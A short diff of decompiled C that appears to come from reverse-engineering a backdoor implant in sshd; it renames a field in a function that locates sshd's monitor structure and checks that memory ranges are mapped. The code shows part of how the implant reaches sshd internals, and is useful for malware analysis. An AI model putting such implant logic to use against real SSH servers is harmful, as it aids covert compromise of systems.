@@ -34,9 +34,9 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
   if (sshbuf == (sshbuf *)0x0) {
     return FALSE;
   }
-  if (((ctx != (global_context_t *)0x0) && (ctx->struct_monitor_ptr_address != (monitor **)0x0)) &&
-     (success = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), success != FALSE)) {
-    monitor_ptr = *ctx->struct_monitor_ptr_address;
+  if (((ctx != (global_context_t *)0x0) && (ctx->monitor_struct_slot != (monitor **)0x0)) &&
+     (success = is_range_mapped((u8 *)ctx->monitor_struct_slot,8,ctx), success != FALSE)) {
+    monitor_ptr = *ctx->monitor_struct_slot;
     success = is_range_mapped((u8 *)monitor_ptr,0x20,ctx);
     if (success != FALSE) {
       pkex_index = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
